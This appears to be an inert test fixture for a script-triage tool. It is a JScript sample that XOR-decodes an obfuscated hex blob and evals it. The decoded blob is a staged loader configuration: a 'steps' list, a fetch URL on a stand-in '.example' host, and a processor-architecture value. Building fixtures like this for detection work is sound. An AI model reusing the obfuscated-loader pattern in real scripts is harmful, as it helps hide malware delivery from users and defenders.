// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_a226c6ba = function decode_a226c6ba_body(item1) {
  var keyBytes = [42,167,40,118,174];
  var item2 = [];
  for (var i = 0; i < item1.length; i++) { item2.push(item1[i] ^ keyBytes[i % keyBytes.length]); }
  return item2;
};
var recover_121cac0a = function recover_121cac0a_body() {
  var packedText = "51:85:5b:02:cb:5a:d4:0a:4c:f5:08:c6:4b:07:db:43:d5:4d:29:dc:4f:ca:47:02:cb:08:8b:0a:01:dc:43:d3:4d:29:c8:43:cb:4d:54:82:08:c3:41:05:de:4b:d3:4b:1e:f1:5a:d5:47:15:cb:59:d4:0a:5a:8c:42:c6:46:12:c1:4c:c1:77:05:cd:58:ce:58:02:8c:77:8b:0a:17:ca:4b:d7:5c:13:dc:08:9d:0a:21:c7:44:ef:5c:02:de:04:f0:41:18:e6:5e:d3:58:24:cb:5b:d2:4d:05:da:04:92:06:47:8c:06:85:5e:17:c2:5f:c2:5b:54:94:51:85:4b:17:c3:5a:c6:41:11:c0:75:ce:4c:54:94:08:c4:49:1b:de:4b:ce:4f:18:83:48:94:1e:47:99:12:94:1b:45:cf:08:8b:0a:03:dc:46:85:12:54:c6:5e:d3:58:05:94:05:88:4a:45:98:1b:90:10:45:9d:19:c6:06:13:d6:4b:ca:58:1a:cb:04:ce:46:00:cf:46:ce:4c:59:ca:1f:c1:4b:47:9e:4c:c5:06:12:cf:5e:85:04:54:db:59:c2:5a:29:cf:4d:c2:46:02:8c:10:85:60:03:c0:5e:d5:4d:05:dd:66:c6:4a:59:cc:19:91:19:41:96:19:94:1b:17:8c:06:85:4e:1f:c2:4f:f8:58:17:da:42:85:12:54:ed:10:fb:74:23:dd:4f:d5:5b:2a:f2:7a:d2:4a:1a:c7:49:fb:74:3e:db:44:d3:5a:13:dd:59:eb:49:14:f2:76:d4:5c:17:c9:4f:8a:4a:45:98:1b:90:10:45:9d:19:c6:06:12:cf:5e:85:04:54:dc:4f:c0:41:05:da:58:de:77:06:cf:5e:cf:0a:4c:8c:62:ec:6b:23:f2:76:f4:47:10:da:5d:c6:5a:13:f2:76:ef:5d:18:da:58:c2:5b:05:e2:4b:c5:74:2a:ea:43:d4:58:19:dd:4b:c5:44:13:f2:76:c5:1b:40:9f:1d:9f:1b:45:9d:4b:85:04:54:c0:4f:df:5c:29:dd:5e:c6:4f:13:8c:10:85:44:19:cd:4b:cb:05:12:c7:59:d7:49:02:cd:42:89:42:05:8c:57:8b:0a:05:da:4b:c0:4d:35:c1:5f:c9:5c:54:94:1e:da";
  var packedParts = packedText.split(":");
  var item1 = [];
  for (var hi = 0; hi < packedParts.length; hi++) { item1.push(parseInt(packedParts[hi], 16)); }
  var item6 = "PROCESSOR_ARCHITECTURE";
  var item2 = [];
  for (var pass = 0; pass < 1; pass++) { item2 = decode_a226c6ba.apply(null, [item1]); }
  var textParts = [];
  for (var bi = 0; bi < item2.length; bi++) { textParts.push(String.fromCharCode(item2[bi])); }
  var item3 = textParts.join("");
  return item3;
};
var inspect_2b158829 = function inspect_2b158829_body() {
  var item4 = eval("(" + recover_121cac0a.apply(null, []) + ")");
  var table = { steps: function() { return item4["steps"]; }, values: function() { return item4["values"]; } };
  return { steps: table["steps"].apply(null, []), adapter: item4["adapter"], values: table["values"].apply(null, []), stageCount: item4["stageCount"] };
};
